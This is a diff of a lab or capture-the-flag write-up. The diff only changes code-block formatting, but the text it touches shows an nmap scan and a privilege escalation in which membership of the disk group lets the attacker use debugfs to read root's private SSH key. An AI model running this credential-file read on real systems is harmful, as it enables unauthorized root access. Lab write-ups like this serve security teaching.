@@ -21,7 +21,7 @@ featured: true
 
 We start the enumeration process with a simple Nmap scan:
 
-<code style="background:black">┌──(kali㉿kali)-[~]
+<div class="language-bash"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
 └─$ nmap 192.168.146.150
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 14:10 IST
 Nmap scan report for 192.168.146.150
@@ -33,7 +33,7 @@ PORT     STATE SERVICE
 9090/tcp open  zeus-admin
 
 Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
-</code>
+</code></pre></div></div>
 
 We find ports `22`, `3000`, `9090` are open.
 
@@ -131,7 +131,8 @@ uid=1002(sysadmin) gid=1002(sysadmin) groups=1002(sysadmin),6(disk)
 
 - We exploit the disk group privileges to read root user’s private SSH key
 
-<code style="background:black">
+
+<div class="language-bash"><div class="highlight"><pre class="highlight"><code>
 $ df -h
 Filesystem      Size  Used Avail Use% Mounted on
 udev            1.9G     0  1.9G   0% /dev
@@ -148,17 +149,17 @@ tmpfs           2.0G     0  2.0G   0% /sys/fs/cgroup
 /dev/sda1       511M  4.0K  511M   1% /boot/efi
 tmpfs           390M   24K  390M   1% /run/user/1000
 tmpfs           390M  8.0K  390M   1% /run/user/1002
-</code>
+</code></pre></div></div>
 
 Use debugfs to read the files in the partition
 
 > DebugFS is a simple-to-use RAM-based file system specially designed for debugging purposes. It can be used to access files within a given partition
 
-<code style="background:black">
+<div class="language-bash"><div class="highlight"><pre class="highlight"><code>
 $ debugfs /dev/sda5
 debugfs:  cd /root/.ssh
 debugfs:  cat id_rsa
-</code>
+</code></pre></div></div>
 
 - Since we can read the contents inside the root directory, read root private SSH key
 - After obtaining the root private SSH key, we’ll login to the system via SSH as root
